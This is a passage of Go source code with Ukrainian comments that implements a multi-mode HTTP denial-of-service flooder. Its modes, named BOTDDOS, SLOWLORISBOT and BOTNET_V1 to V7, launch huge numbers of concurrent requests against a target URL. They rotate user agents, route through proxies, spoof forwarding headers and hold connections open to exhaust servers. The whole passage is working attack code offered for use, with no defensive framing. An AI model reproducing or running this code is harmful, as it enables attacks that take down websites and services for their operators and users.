					client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
						return http.ErrUseLastResponse
					}
				}
				req.Header.Set("User-Agent", userAgents[j%len(userAgents)])
				req.URL.Scheme = "https"

				start := time.Now()
				resp, err := client.Do(req)
				if err != nil {
					log.Printf("Error: %v", err)
				} else {
					defer resp.Body.Close()
					// змінюємо KeepAlive для більш високої швидкості передачі даних
					resp.Header.Set("Connection", "Keep-Alive")
					elapsed := time.Since(start)
					fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), j+1, resp.Status, elapsed)
				}
			}
		}(i)
	}
	case "ANTIDDOS":
	data := []byte(`{"foo":"bar"}`)
	contentLength := len(data)
	chunkSize := 2048 // збільшуємо розмір фрагмента пам'яті до 2048
	for i := 0; i < max_requests_global*2; i++ { // збільшуємо кількість запитів на сервер удвічі
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
			mutex.Lock()
			if cache[key] >= max_requests_global*2 { // збільшуємо ліміт запитів на сервер удвічі
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()
			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			req.Header.Set("Content-Type", "application/json")
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])

			// збільшуємо розмір фрагментів на 2-5 рази
			chunkSize = rand.Intn(4-2+1) * 1024
			for j := 0; j < contentLength; j += chunkSize {
				end := j + chunkSize
				if end > contentLength {
					end = contentLength
				}
				chunk := data[j:end]
				req.Body = ioutil.NopCloser(bytes.NewReader(chunk))
				req.ContentLength = int64(len(chunk))

				// додавання випадкової затримки від 1 до 3 секунд перед запитом
				rand.Seed(time.Now().UnixNano())
				delay := time.Duration(rand.Intn(3-1+1)+1) * time.Second
				time.Sleep(delay)

				start := time.Now()
				resp, err := client.Do(req)
				if err != nil {
					log.Printf("Error: %v", err)
				} else {
					defer resp.Body.Close()
					elapsed := time.Since(start)
					fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
				}
			}
		}(i)
	}
	case "BOTDDOS":
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)

		go func(i int) {
			defer wg.Done()

			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "ULTRAPOWERSLOW")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
			req.Header.Set("X-Requested-With","XMLHttpRequest") // Додаємо хедер для ботів
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
			time.Sleep(time.Second * 60) // затримка на 1 хвилину

		}(i)
	}
	case "ANTIDDOSBOT":
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)

		go func(i int) {
			defer wg.Done()

			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "ULTRAPOWERSLOW")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
			req.Header.Set("X-Requested-With","XMLHttpRequest") // Додаємо хедер для ботів
			req.Header.Set("Connection", "Keep-Alive") // Додаємо хедер для ботів 
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
			time.Sleep(time.Second * 600) // затримка на 10 хвилин 

		}(i)
	}
	case "SUPERBOT":
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "SUPERBOT")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
			req.Header.Set("X-Requested-With", "XMLHttpRequest")
			req.Header.Add("Referer", "www.example.com") // додаємо посилання для відрізнення наших ботів
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
 
			time.Sleep(time.Second * 120) // Додаємо затримку на 2 хвилини			
		}(i)
	}
	case "SLOWLORISBOT":	
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "SLOWLORISBOT")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			timeout := time.Duration(30 * time.Second)
			client := http.Client{
				Timeout: timeout,
			}
			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req.Header.Set("User-Agent", userAgents[i%len(userAgents)])
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
				
				// Додавання випадкової затримки від 1 до 3 секунд 
				rand.Seed(time.Now().UnixNano())
				delay := time.Duration(rand.Intn(3-1+1)+1) * time.Second
				time.Sleep(delay)
				// Зміна headers для подовження активності стрілка піклування сервера
				req.Header.Add("X-Requested-With","XMLHttpRequest")
				req.Header.Add("Connection", "Keep-Alive")
				req.Header.Add("Keep-Alive", "timeout=30")

				client := &http.Client{}
				if resp.StatusCode == 429 {
					return //exit if server already blocked us
				}
				for {
					start := time.Now()
					client.Do(req)
					fmt.Println("Time elapsed:", time.Since(start).Seconds())
					time.Sleep(10 * time.Second) // Time to keep the connection open
				}
			}
		}(i)
	}
	case "SUPERULTIMATEBOT":
	for i := 0; i < max_requests_global; i++ {
		wg.Add(1)

		go func(i int) {
			defer wg.Done()

			key := fmt.Sprintf("%s:%s:%t:%s", urlString, method, allow_redirects, "ULTRAHTTPS")
			mutex.Lock()
			if cache[key] >= max_requests_global {
				mutex.Unlock()
				return
			}
			cache[key]++
			mutex.Unlock()

			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
            // підключення ботів
			bNum := 50 // номер бота
			req.Header.Set("User-Agent", userAgents[bNum])
			req.URL.Scheme = "https"
			start := time.Now()
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
			time.Sleep(time.Millisecond * 100) // затримка на 100 мілісекунд
			req2, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			if !allow_redirects {
				client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
					return http.ErrUseLastResponse
				}
			}
			req2.Header.Set("User-Agent", userAgents[bNum])
			req2.URL.Scheme = "https"
			start2 := time.Now()
			resp2, err := client.Do(req2)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp2.Body.Close()
				elapsed2 := time.Since(start2)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp2.Status, elapsed2)
			}
		}(i)
	}
	case "BOTNET_V1":
	data := []byte(`{"foo":"bar"}`)
contentLength := len(data)
chunkSize := 3048
for i := 0; i < max_requests_global*1600; i++ {
	wg.Add(1)
	go func(i int) {
		defer wg.Done()
		key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
		mutex.Lock()
		cache[key]++
		mutex.Unlock()
		req, err := http.NewRequest(method, urlString, nil)
		if err != nil {
			log.Fatalln(err)
		}
		req.Header.Set("Content-Type", "application/json")
		if proxies != "" {
			proxyURL, err := url.ParseRequestURI(proxies)
			if err != nil {
				log.Fatalln(err)
			}
			transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
			client.Transport = transport
		}
		// Додай рандомізацію юзер агентов
		rand.Seed(time.Now().UnixNano())
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

		// Додай рандомізацію розміру чанка
		chunkSize = rand.Intn(4-2+1) * 1024
		for j := 0; j < contentLength; j += chunkSize {
			end := j + chunkSize
			if end > contentLength {
				end = contentLength
			}
			chunk := data[j:end]
			req.Body = ioutil.NopCloser(bytes.NewReader(chunk))
			req.ContentLength = int64(len(chunk))

			// Додай рандомізацію затримки
			rand.Seed(time.Now().UnixNano())
			delay := time.Duration(rand.Intn(2-1+1)+1) * time.Second
			time.Sleep(delay)

			bot := &http.Client{
				Timeout: time.Second * 40,
				Transport: &http.Transport{
					MaxIdleConns:        20,
					MaxIdleConnsPerHost: 30,
					IdleConnTimeout:     60 * time.Second,
				},
			}
			start := time.Now()
			resp, err := bot.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
		}
	}(i)
}
case "BOTNET_V2":
	data := []byte(`{"foo":"bar"}`)
contentLength := len(data)
chunkSize := 3048
for i := 0; i < max_requests_global*16000; i++ {
	wg.Add(1)
	go func(i int) {
		defer wg.Done()
		key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
		mutex.Lock()
		cache[key]++
		mutex.Unlock()
		req, err := http.NewRequest(method, urlString, nil)
		if err != nil {
			log.Fatalln(err)
		}
		req.Header.Set("Content-Type", "application/json")
		if proxies != "" {
			proxyURL, err := url.ParseRequestURI(proxies)
			if err != nil {
				log.Fatalln(err)
			}
			transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
			client.Transport = transport
		}
		// Додай рандомізацію юзер агентов
		rand.Seed(time.Now().UnixNano())
		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

		// Додай рандомізацію розміру чанка
		chunkSize = rand.Intn(8-4+1) * 1024
		for j := 0; j < contentLength; j += chunkSize {
			end := j + chunkSize
			if end > contentLength {
				end = contentLength
			}
			chunk := data[j:end]
			req.Body = ioutil.NopCloser(bytes.NewReader(chunk))
			req.ContentLength = int64(len(chunk))

			bot := &http.Client{
				Timeout: time.Second * 40,
				Transport: &http.Transport{
					MaxIdleConns:        200,
					MaxIdleConnsPerHost: 300,
					IdleConnTimeout:     600 * time.Second,
				},
			}
			start := time.Now()
			resp, err := bot.Do(req)
			if err != nil {
				log.Printf("Error: %v", err)
			} else {
				defer resp.Body.Close()
				elapsed := time.Since(start)
				fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
			}
		}
	}(i)
}
	case "BOTNET_V4":
	data := []byte(`{"foo":"bar"}`)
	chunkSize := 16384
	contentLength := len(data) // Додали ініціалізацію contentLength
	for i := 0; i < max_requests_global*20000; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
			mutex.Lock()
			cache[key]++
			mutex.Unlock()
			req, err := http.NewRequest(method, urlString, nil)
			if err != nil {
				log.Fatalln(err)
			}
			req.Header.Set("Content-Type", "application/json")
			if proxies != "" {
				proxyURL, err := url.ParseRequestURI(proxies)
				if err != nil {
					log.Fatalln(err)
				}
				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
				client.Transport = transport
			}
			// Додай рандомізацію юзер агентов
			rand.Seed(time.Now().UnixNano())
			req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])

			// Додати схему HTTPS
			req.URL.Scheme = "https"

			// Додай рандомізацію розміру чанка
			chunkSize = rand.Intn(8-4+1)*1024 + 16384
			for j := 0; j < contentLength; j += chunkSize {
				end := j + chunkSize
				if end > contentLength {
					end = contentLength
				}
				chunk := data[j:end]
				req.Body = ioutil.NopCloser(bytes.NewReader(chunk))
				req.ContentLength = int64(len(chunk))

				bot := &http.Client{
					Timeout: time.Second * 60,
					Transport: &http.Transport{
						MaxIdleConns:        500,
						MaxIdleConnsPerHost: 500,
						IdleConnTimeout:     600 * time.Second,
						TLSClientConfig: &tls.Config{
							InsecureSkipVerify: true,
							MaxVersion:         tls.VersionTLS12,
							MinVersion:         tls.VersionTLS10,
						},
					},
				}
				start := time.Now()
				resp, err := bot.Do(req)
				// Додай обробку відповіді і постав додаткових запитів
				if err != nil {
					log.Printf("Error: %v", err)
				} else {
					defer resp.Body.Close()
					if resp.StatusCode == http.StatusOK {
						// Додавання додаткових запитів на сервер
						req, err := http.NewRequest(method, urlString, nil)
						if err != nil { // Обробка помилки, якщо вона виникає при ініціалізації req
							log.Printf("Error: %v", err)
						} else {
							req.Header.Set("Content-Type", "application/json")
							bot.Do(req)
						}
						
						elapsed := time.Since(start)
						fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
					}
				}
			}
		}(i)
	}
	case "BOTNET_V6":
    data := []byte(`{"foo":"bar"}`)

    bot := &http.Client{
        Timeout: time.Second * 60,
        Transport: &http.Transport{
            MaxIdleConns:        5000,
            MaxIdleConnsPerHost: 5000,
            IdleConnTimeout:     600 * time.Second,
            TLSClientConfig: &tls.Config{
                InsecureSkipVerify: true,
                MaxVersion:         tls.VersionTLS13,
                MinVersion:         tls.VersionTLS11,
            },
            DisableKeepAlives:   false, // включена підтримка Keep-Alive
            ResponseHeaderTimeout: time.Second * 60, // таймаут для отримання заголовків від сервера
            ExpectContinueTimeout: 1 * time.Second, // таймаут для очікування підтвердження сервера на продовження запиту
        },
    }

    cookie := &http.Cookie{
        Name:     "auth",
        Value:    "SECURE_COOKIE_FOO",
        HttpOnly: true,
    }

    contentLength := len(data)
    chunkSize := 35000
    for i := 0; i < max_requests_global*60000; i++ {
        wg.Add(1)
        go func(i int) {
            defer wg.Done()
            key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
            mutex.Lock()
            cache[key]++
            mutex.Unlock()
            r, _ := http.NewRequest("SLOWER_POST_HEAD", urlString, nil)
            if proxies != "" {
                proxyURL, err := url.ParseRequestURI(proxies)
                if err != nil {
                    log.Fatalln(err)
                }
                transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
                bot.Transport = transport
            }
            if i%2 == 0 {
                r.Header.Add("X-Forwarded-For", "10.0.0.1")
                r.Header.Add("X-Forwarded-Host", "1.1.1.1")
                r.Header.Add("X-Forwarded-Proto", "http")
                r.Header.Add("X-Real-IP", "10.0.1.1")
            } else {
                r.Header.Add("X-Forwarded-For", "9.0.0.76")
                r.Header.Add("X-Forwarded-Host", "9.9.9.9")
                r.Header.Add("X-Forwarded-Proto", "https")
                r.Header.Add("X-Real-IP", "9.99.10")
            }
            rand.Seed(time.Now().UnixNano())
            r.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
            r.URL.Scheme = "https"
            chunkSize = rand.Intn(8-4+1)*1024 + 35000
            for j := 0; j < contentLength; j += chunkSize {
                end := j + chunkSize
                if end > contentLength {
                    end = contentLength
                }
                chunk := data[j:end]
                if i%2 == 0 {
                    buf := make([]byte, 1024)
                    r.Body = ioutil.NopCloser(bytes.NewReader(buf))
                } else {
                    r.Body = ioutil.NopCloser(bytes.NewReader(chunk))
                    r.ContentLength = int64(len(chunk))
                }
                r.Header.Set("Connection", "keep-alive")
                r.Header.Set("Timeout", "1000")
                r.Header.Set("X-Protocol-Level", "2")
                start := time.Now()
                resp, err := bot.Do(r)
                if err != nil {
                    log.Printf("Error: %v", err)
                } else {
                    defer resp.Body.Close()
                    if resp.StatusCode == http.StatusOK {
                        req, err := http.NewRequest(method, urlString, nil)
                        if err != nil {
                            log.Printf("Error: %v", err)
                        } else {
                            req.Header.Set("Content-Type", "application/json")
                            if i%2 == 0 {
                                req.Header.Set("X-Forwarded-For", "10.0.0.1")
                            } else {
                                req.Header.Set("X-Forwarded-For", "9.0.0.1")
                            }
                            req.AddCookie(cookie) // added line to add cookie to request headers
                            req.Header.Set("X-Protocol-Level", "3")
                            req.Header.Set("HTTPS-SYN", "true") // added line for HTTPS-SYN
                            bot.Do(req)
                        }
                        elapsed := time.Since(start)
                        fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
                    }
                }
            }
        }(i)
    }
    case "BOTNET_V7":
    paramsData := url.Values{}
    paramsData.Set("foo", "bar")
    data := []byte(`{"foo":"bar"}`)

    bot := &http.Client{
        Timeout: time.Second * 60,
        Transport: &http.Transport{
            MaxIdleConns:        5000,
            MaxIdleConnsPerHost: 5000,
            IdleConnTimeout:     600 * time.Second,
            TLSClientConfig: &tls.Config{
                InsecureSkipVerify: true,
                MaxVersion:         tls.VersionTLS13,
                MinVersion:         tls.VersionTLS11,
            },
            DisableKeepAlives:   false,
            ResponseHeaderTimeout: time.Second * 60,
            ExpectContinueTimeout: 1 * time.Second,
        },
    }

    cookie := &http.Cookie{
        Name:     "auth",
        Value:    "SECURE_COOKIE_FOO",
        HttpOnly: true,
    }

    contentLength := len(data)
    chunkSize := 35000
    for i := 0; i < max_requests_global*60000; i++ {
        wg.Add(1)
        go func(i int) {
            defer wg.Done()
            key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
            mutex.Lock()
            cache[key]++
            mutex.Unlock()
            r, _ := http.NewRequest(method, urlString, bytes.NewBuffer(data))
            if proxies != "" {
                proxyURL, err := url.ParseRequestURI(proxies)
                if err != nil {
                    log.Fatalln(err)
                }
                transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
                bot.Transport = transport
            }
            if i%2 == 0 {
                r.Header.Set("X-Forwarded-For", "10.0.0.1")
                r.Header.Set("X-Forwarded-Host", "1.1.1.1")
                r.Header.Set("X-Forwarded-Proto", "http")
                r.Header.Set("X-Real-IP", "10.0.1.1")
            } else {
                r.Header.Set("X-Forwarded-For", "9.0.0.76")
                r.Header.Set("X-Forwarded-Host", "9.9.9.9")
                r.Header.Set("X-Forwarded-Proto", "https")
                r.Header.Set("X-Real-IP", "9.99.10")
            }
            rand.Seed(time.Now().UnixNano())
            r.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
            r.URL.Scheme = "https"
            r.Header.Set("Content-Type", "application/json")
            r.ContentLength = int64(len(data))
            for j := 0; j < contentLength; j += chunkSize {
                end := j + chunkSize
                if end > contentLength {
                    end = contentLength
                }
                chunk := data[j:end]
                if i%2 == 0 {
                    buf := make([]byte, 1024)
                    r.Body = ioutil.NopCloser(bytes.NewReader(buf))
                } else {
                    r.Body = ioutil.NopCloser(bytes.NewReader(chunk))
                    r.ContentLength = int64(len(chunk))
                }
                r.Header.Set("Connection", "keep-alive")
                r.Header.Set("Timeout", "1000")
                r.Header.Set("X-Protocol-Level", "2")
                r.Header.Set("Custom-Header", "foo")
                r.Header.Set("Another-Header", "bar")
                r.Header.Set("Yet-Another-Header", "baz")
                start := time.Now()
                resp, err := bot.Do(r)
                if err != nil {
                    log.Printf("Error: %v", err)
                } else {
                    defer resp.Body.Close()
                    if resp.StatusCode == http.StatusOK {
                        req, err := http.NewRequest(method, urlString, bytes.NewBufferString(paramsData.Encode()))
                        if err != nil {
                            log.Printf("Error: %v", err)
                        } else {
                            if i%2 == 0 {
                                req.Header.Set("X-Forwarded-For", "10.0.0.1")
                            } else {
                                req.Header.Set("X-Forwarded-For", "9.0.0.1")
                            }
                            req.AddCookie(cookie)
                            req.Header.Set("X-Protocol-Level", "3")
                            req.Header.Set("HTTPS-SYN", "true")
                            req.Header.Set("Another-Custom-Header", "foo")
                            req.Header.Set("Yet-Another-Custom-Header", "bar")
                            bot.Do(req)
                        }
                        elapsed := time.Since(start)
                        fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
                    }
                }
            }
        }(i)
    }
	default:
		log.Fatalln("Invalid HTTP method")
	}

	wg.Wait()
}